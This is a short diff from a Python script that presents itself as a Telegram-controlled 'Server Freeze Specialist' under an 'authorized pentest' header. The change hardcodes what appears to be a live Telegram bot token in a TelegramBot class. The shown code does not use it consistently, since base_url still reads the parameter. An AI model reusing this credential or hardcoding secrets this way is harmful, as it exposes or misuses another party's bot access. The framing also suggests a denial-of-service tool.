@@ -23,7 +23,7 @@ print("⚡ Telegram Controlled - Server Freeze Specialist")
 # ==================== TELEGRAM BOT - AUTHORIZED PENTEST ====================
 class TelegramBot:
     def __init__(self, token):
-        self.token = token
+        self.token = "8732926521:AAEWoCcOAMhRMFTX49SMz2M1FSRXFUXotGQ"
         self.base_url = f"https://api.telegram.org/bot{token}"
         
     def send_message(self, chat_id, text, reply_markup=None):
